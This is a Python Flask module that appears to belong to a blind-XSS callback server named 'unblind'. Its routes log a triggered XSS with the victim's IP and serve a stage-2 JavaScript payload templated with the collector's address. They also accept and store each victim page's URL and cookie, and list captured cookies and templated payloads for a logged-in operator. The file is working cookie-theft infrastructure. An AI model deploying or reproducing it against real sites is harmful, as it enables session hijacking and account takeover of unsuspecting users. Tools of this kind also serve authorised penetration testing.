# main.py

from flask import Blueprint, render_template, request, send_from_directory, flash
from flask_login import login_required
from . import db, config
from .models import XSS
import uuid
from datetime import datetime
import json
from base64 import b64decode, urlsafe_b64decode
import shutil
import os
import threading
from time import sleep


main = Blueprint('main', __name__)

@main.route('/')
def root():
    return render_template('login.html')

@main.route('/index')
@login_required
def index():
    return render_template('index.html')

# new xss/xxe found, store it inside the db: stage_1
@main.route(config["main_endpoint"] + '/<path:xxx>/<path:random_str>', methods=['GET'])
def new_xxx(xxx, random_str):
    def delete_file_once_downloaded(filename):
        sleep(5)
        os.remove(filename)
        print("[*] " + filename + ": DELETED")
        return True

    if random_str == "":
        return render_template('index.html')

    if random_str[-3:] == ".js":
        pass

    today = datetime.now()

    #print(xxx)

    if xxx == "xss":
        xss_uid = str(uuid.uuid4())
        xss_created_at = today.strftime("%d/%m/%Y - %H:%M")
        xss_value = random_str
        xss_ip_from = request.remote_addr
        xss_stage_1 = True
        xss_stage_2 = False

        new_xss = XSS(xss_uid=xss_uid, xss_created_at=xss_created_at, xss_value=xss_value, xss_ip_from=xss_ip_from, xss_stage_1=xss_stage_1, xss_stage_2=xss_stage_2)
        db.session.add(new_xss)
        db.session.commit()

        current_dir = os.getcwd() + "/unblind/static/"
        path = "js/payloads/"
        original_file = "stage_2.js"
        new_file = xss_uid + ".js"
        shutil.copyfile(current_dir + path + original_file, current_dir + path + new_file)
        
        fin = open(current_dir + path + new_file, "rt")
        data = fin.read()
        data = data.replace('{{IP}}', config["unblind_url"])
        data = data.replace('{{PORT}}', config["unblind_port"])
        data = data.replace('{{INFO_ENDPOINT}}', config["stage_2_endpoint"])
       
        data = data.replace('{{UID}}', xss_uid)
        fin.close()
        fin = open(current_dir + path + new_file, "wt")
        fin.write(data)
        fin.close()

        thread = threading.Thread(target=delete_file_once_downloaded, args=(current_dir + path + new_file,))
        thread.start()
        return send_from_directory("static", path + new_file)

    elif xxx == "xxe":
        pass

    else:
        return ""

# grab cookie, url, uid after stage_2
@main.route(config["main_endpoint"] + config["stage_2_endpoint"] + '/<path:xxx_uid>', methods=['POST'])
def grab_info(xxx_uid):
    # POST's content is a json base64 encoded
    #{url': 'url', 'cookie': 'cookie'} = eyJ1aWQiOiAiMTIzNDUiLCAidXJsIjogInVybCIsICJjb29raWUiOiAiY29va2llIn0=
    if xxx_uid == "":
        return render_template('index.html')

    try:
        content = request.data 
        info = content
        #info = urlsafe_b64decode(content)
        #info = str(info, "utf-8")
        #info = json.loads(info)

        xss_uid = xxx_uid
        url = info["url"]
        cookie = info["cookie"]
    except Exception as e:
        print(str(e))
        print("[-] Error in get_info()")
        return render_template('index.html')

    try:
        xxx = XSS.query.filter_by(xss_uid=xss_uid).first()
        if xxx:
            xxx.cookie = cookie
            xxx.url = url
            db.session.commit()

            return "success"
        else:
            return "error" # the xss does not exist

    except Exception as e:
        print(str(e))
        print("[-] Error in get_info()")
        return ""
        
# delete xss/xxe
@main.route(config["main_endpoint"] + '/<path:xxx>/<path:xxx_uid>', methods=['DELETE'])
@login_required
def xxx_delete(xxx, xxx_uid):
    if xxx_uid == "":
        return render_template('unblind.html')

    if xxx == "xss":
        xss = XSS.query.filter_by(xss_uid=xxx_uid).first()
        db.session.delete(xss)
        db.session.commit()

        flash('XSS deleted', 'warning')
    
    elif xxx == "xxe":
        pass
        
    else:
        pass

    return render_template('unblind.html')



# list all xss/xxe from db
@main.route(config["main_endpoint"], methods=['GET'])
@login_required
def unblind():
    xss = XSS.query.all()
    xss_results = {}
    c = 0
    for x in xss:
        content = {}
        content["xss_stage_1"] = x.xss_stage_1
        content["xss_stage_2"] = x.xss_stage_2
        content["xss_uid"] = x.xss_uid
        content["xss_created_at"] = x.xss_created_at
        content["xss_value"] = x.xss_value
        content["xss_ip_from"] = x.xss_ip_from
        content["cookie"] = x.cookie
        content["url"] = x.url

        xss_results[c] = content

        c += 1

    #print(xss_results)

    return render_template('unblind.html', xss_results=xss_results, xxe_results={})

# list all payloads
@main.route(config["main_endpoint"] + config["payload_lst_endpoint"], methods=['GET'])
@login_required
def payloads_lst():
    payloads = config["payloads"]

    url = config["unblind_url"]
    port = config["unblind_port"]
    stage_1_endpoint = config["stage_1_endpoint"]

    for i in payloads:
        i["payload"] = i["payload"].replace("{{IP}}", url )
        i["payload"] = i["payload"].replace("{{PORT}}", port)
        i["payload"] = i["payload"].replace("{{ENDPOINT}}", stage_1_endpoint)

    p = {"p":payloads}

    return render_template('payloads.html', results=p)